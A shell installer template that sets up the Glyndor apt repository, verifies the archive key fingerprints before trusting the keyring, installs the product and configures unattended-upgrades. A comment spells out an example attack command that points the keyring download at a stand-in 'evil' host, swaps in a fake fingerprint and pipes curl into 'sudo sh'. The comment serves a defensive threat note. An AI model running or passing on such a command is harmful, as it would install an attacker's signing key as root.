#!/bin/sh
# Set up the Glyndor apt repository and install @PRODUCT@.
#
# Usage: ./install.sh
#
# Generated from scripts/install-template.sh in Glyndor/apt. Do not edit the
# published copy - edit the template.
#
# @PRODUCT@ ships as a signed .deb, so apt is the install: it verifies every
# package on every upgrade rather than once, and `apt upgrade` is what keeps the
# machine current. A binary dropped somewhere by hand stays on the version it
# was installed at until somebody remembers it.
#
# Installing through apt also brings in whatever @PRODUCT@ recommends, because
# apt installs Recommends by default. This sentence used to name podman and
# podup specifically: true of epistle, which was the only product generated
# from this template at the time, and false the moment the template rendered
# for anything else - podup recommends podman alone, so its own installer would
# have claimed that installing podup brings podup in.
set -eu

KEYRING_URL="${KEYRING_URL:-https://apt.glyndor.net/glyndor-archive-keyring.deb}"
KEYRING_PATH="/usr/share/keyrings/glyndor.gpg"

# Fingerprint of the archive signing key. Downloading the keyring package is the
# one step that has nothing but the transport behind it; checking what it
# installed against this constant is what closes that window. Override for a
# fork with GLYNDOR_APT_FPR.
#
# Spaces are stripped and the value is upper-cased before it is compared, so
# the grouped form gpg prints and the README publishes -- "9ADF 04EA ..." --
# can be pasted straight in. Without that, a fork operator copying the
# published fingerprint gets "does not carry the expected fingerprint", which
# points at the key when the fault is the spaces.
GLYNDOR_APT_FPR="${GLYNDOR_APT_FPR:-9ADF04EA8C3139CDB67303CFA6705C2EA153F3D6}"

# Both overrides above exist for forks and both are silent, which is the part
# worth changing. The attack they enable is not "someone controls your shell" --
# anyone who does needs no override. It is a copied command line:
#
#   KEYRING_URL=http://evil/x.deb GLYNDOR_APT_FPR=DEAD... \
#     curl -fsSL https://apt.glyndor.net/install/@PRODUCT@ | sudo sh
#
# The visible URL is the real one. Everything that would have made the
# substitution obvious is in the environment, off the end of what a reader
# checks.
#
# Blocking the override would break the fork it was written for, so instead say
# what is in use. A line on the screen does not stop anyone determined; it
# removes the case where the substitution is invisible to someone who would have
# noticed it.
DEFAULT_URL="https://apt.glyndor.net/glyndor-archive-keyring.deb"
DEFAULT_FPR="9ADF04EA8C3139CDB67303CFA6705C2EA153F3D6"
url_overridden=no
fpr_overridden=no
[ "$KEYRING_URL" = "$DEFAULT_URL" ] || url_overridden=yes
[ "$(printf '%s' "$GLYNDOR_APT_FPR" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]')" \
	= "$DEFAULT_FPR" ] || fpr_overridden=yes

fail() {
	echo "error: $1" >&2
	exit 1
}

[ "$(id -u)" -eq 0 ] || fail "run this as root (sudo sh install.sh)"

command -v apt-get >/dev/null 2>&1 \
	|| fail "no apt-get found. @PRODUCT@ ships as a .deb; on a non-Debian system, build from source (https://github.com/Glyndor/@PRODUCT@)"
command -v dpkg >/dev/null 2>&1 || fail "no dpkg found"
# dpkg-deb ships inside the dpkg package, so this guard is redundant on a sane
# system. It is here so that a stripped-down image fails with a clear message
# instead of "dpkg-deb: command not found" halfway through the keyring step.
command -v dpkg-deb >/dev/null 2>&1 || fail "no dpkg-deb found"

workdir=
installed_gnupg=

# Leaves nothing of its own behind, on every exit path including the failures:
# the downloaded keyring package, and gnupg if this script is what pulled it in.
cleanup() {
	[ -n "$workdir" ] && rm -rf "$workdir"
	if [ -n "$installed_gnupg" ]; then
		echo "Removing the gnupg this script installed ..."
		apt-get purge -y -qq --auto-remove gnupg >/dev/null 2>&1 || true
	fi
	return 0
}
trap cleanup EXIT

# gpg comes from the distribution's own trusted repositories, not ours, so
# installing it here does not widen what has to be trusted. It is needed for one
# fingerprint read and nothing else, so it goes back out again afterwards -
# purged with --auto-remove, and only when it was absent to begin with.
if ! command -v gpg >/dev/null 2>&1; then
	echo "Installing gnupg (needed to check the archive key) ..."
	apt-get update -qq
	apt-get install -y -qq gnupg || fail "could not install gnupg"
	installed_gnupg=yes
fi

workdir=$(mktemp -d)

# Printed after the tool checks, so the message lands on a machine that can act
# on it rather than scrolling past a "no apt-get found" a moment later.
if [ "$url_overridden" = yes ] || [ "$fpr_overridden" = yes ]; then
	echo "NOTE: this is not the stock Glyndor install." >&2
	[ "$url_overridden" = no ] || echo "  keyring source: $KEYRING_URL (default is $DEFAULT_URL)" >&2
	[ "$fpr_overridden" = no ] || echo "  expected key:   $GLYNDOR_APT_FPR (default is $DEFAULT_FPR)" >&2
	if [ "$url_overridden" = yes ] && [ "$fpr_overridden" = yes ]; then
		echo "  Both were replaced, so nothing here is checked against Glyndor's" >&2
		echo "  published key. That is correct for a fork and wrong for anything else." >&2
	fi
fi

echo "Downloading the archive keyring ..."
# Bounded, and redirects kept on https.
#
# The keyring is ~2 KB and stays kilobytes even carrying both keys through a
# rotation, so 8 MB is four thousand times the real size and still refuses a
# server that answers a 2 KB request with an endless body. Without it the only
# limit is the disk: this runs as root, and /tmp filling up takes the machine
# with it, before any fingerprint is ever compared.
#
# --proto-redir=https keeps -L from being talked down to http:// by a redirect.
# The fingerprint check would still refuse whatever arrived, but there is no
# reason to fetch a trust anchor over a downgraded connection to find out.
curl -fsSL --proto-redir =https --max-filesize $((8 * 1024 * 1024)) \
	-o "$workdir/glyndor-archive-keyring.deb" "$KEYRING_URL" \
	|| fail "could not download $KEYRING_URL (over 8 MB, or the transfer failed)"

# Extract WITHOUT installing. `dpkg-deb -x` unpacks the data archive and runs no
# maintainer script, so nothing from the downloaded package executes until its
# key has been checked. `dpkg -i` here would run preinst/postinst as root, and
# those scripts can write the very keyring the check below reads -- with the
# expected fingerprint alongside an attacker's, which the presence test admits.
# Normalise here rather than where the constant is set: `tr` must not be
# needed before the guards above have established that this is a Debian system
# with the tools the installer uses. Reaching for a command ahead of the check
# that the environment has it is how a "no apt-get found" refusal turns into
# "tr: command not found".
# One fingerprint per line, spaces stripped and upper-cased, so the grouped form
# gpg prints can be pasted in and several can be given separated by commas.
GLYNDOR_APT_FPR="$(printf '%s' "$GLYNDOR_APT_FPR" \
	| tr ',' '\n' | tr -d '[:blank:]' | tr '[:lower:]' '[:upper:]' | grep -v '^$')"

echo "Checking the archive key fingerprint ..."
mkdir -p "$workdir/extracted"
dpkg-deb -x "$workdir/glyndor-archive-keyring.deb" "$workdir/extracted" \
	|| fail "could not extract the keyring package"

# EVERY key in the keyring must be one this installer was told to expect, not
# just one of them. The presence test this replaces admitted a keyring that
# carried the published key alongside an attacker's: apt then trusted both, and
# the sources.list the same package installs decides where it fetches from. That
# is what an attacker who can serve this .deb needs, and the published
# fingerprint does not stop it, because the published fingerprint is right there.
#
# A rotation still works: during the overlap the keyring carries the old key and
# the new one, so GLYNDOR_APT_FPR carries both. The order matters now -- publish
# both fingerprints BEFORE publishing the keyring that carries both, or clients
# refuse the new keyring until the second one is out.
#
# Only primary fingerprints are compared. `--with-colons` emits an `fpr:` line
# per subkey as well, and a subkey's fingerprint is not something anyone
# publishes; taking the first `fpr:` after each `pub:` is what isolates them.
keyring_fprs="$(gpg --show-keys --with-colons "$workdir/extracted$KEYRING_PATH" 2>/dev/null \
	| awk -F: '/^pub:/{want=1;next} /^fpr:/{if(want){print $10;want=0}}')"

[ -n "$keyring_fprs" ] \
	|| fail "the downloaded package carries no archive key at all; nothing was installed"

for fpr in $keyring_fprs; do
	printf '%s\n' "$GLYNDOR_APT_FPR" | grep -qxF "$fpr" || fail \
		"the downloaded keyring carries a key this installer was not told to expect ($fpr); nothing was installed"
done

echo "Installing the keyring ..."
dpkg -i "$workdir/glyndor-archive-keyring.deb" >/dev/null \
	|| fail "could not install the keyring package"

echo "Installing @PRODUCT@ ..."
apt-get update -qq
apt-get install -y @PRODUCT@ || fail "apt could not install @PRODUCT@"

# Automatic upgrades.
#
# The keyring package puts this archive on unattended-upgrades' allowlist, which
# is the part that is ours to decide. Whether the machine runs unattended
# upgrades at all is the operator's, and the two cases are handled differently
# on purpose.
#
# Debian ships neither the package nor the `20auto-upgrades` switch that turns
# it on, so on a fresh Debian the allowlist entry alone does nothing. Ubuntu
# server ships both.
if dpkg -s unattended-upgrades >/dev/null 2>&1; then
	# Already there, so it is configured the way this operator wants it. The
	# keyring's allowlist entry is appended to their list rather than replacing
	# it, so Glyndor packages are already covered by whatever schedule they
	# chose. Nothing here to change, and changing it would be presumptuous.
	echo "unattended-upgrades is already installed; leaving its settings alone."
	if [ ! -f /etc/apt/apt.conf.d/20auto-upgrades ]; then
		echo "  note: it is installed but not switched on. To enable it:"
		echo "        sudo dpkg-reconfigure -plow unattended-upgrades"
	fi
else
	echo "Setting up automatic security upgrades ..."
	if apt-get install -y -qq unattended-upgrades; then
		# Only written because this script is what installed the package, so
		# there is no prior configuration to override.
		if [ ! -f /etc/apt/apt.conf.d/20auto-upgrades ]; then
			cat > /etc/apt/apt.conf.d/20auto-upgrades <<'CONF'
APT::Periodic::Update-Package-Lists "1";
APT::Periodic::Unattended-Upgrade "1";
CONF
		fi
		# Conservative for a server that answers on the public internet. Written
		# in its own file rather than by editing Debian's 50unattended-upgrades,
		# so an operator can drop it with one rm and dpkg never fights over it.
		cat > /etc/apt/apt.conf.d/52glyndor-safety <<'CONF'
// Written by the Glyndor installer, and only because it is what brought
// unattended-upgrades onto this machine. If you already ran unattended
// upgrades, this file was not created and your settings were left untouched.
//
// Never reboot on its own. A service dropping at 06:00 because a kernel landed
// is worse than the delay of a planned reboot, and the operator is the one who
// knows when that window is.
Unattended-Upgrade::Automatic-Reboot "false";

// Upgrade in small steps so an interrupted run leaves a working dpkg state
// rather than a half-configured one.
Unattended-Upgrade::MinimalSteps "true";

// Leave removals to the operator. Automatic dependency and kernel cleanup is
// the part of unattended-upgrades most likely to surprise someone.
Unattended-Upgrade::Remove-Unused-Dependencies "false";
Unattended-Upgrade::Remove-Unused-Kernel-Packages "false";
CONF
		echo "  done: security upgrades apply automatically, without rebooting."
	else
		echo "  warning: could not install unattended-upgrades." >&2
		echo "  @PRODUCT@ will not receive security fixes on its own. Install it later with:" >&2
		echo "        sudo apt install unattended-upgrades" >&2
	fi
fi

echo
echo "Installed: $(@PRODUCT@ --version)"
echo "Upgrades and archive-key renewals both arrive through apt."
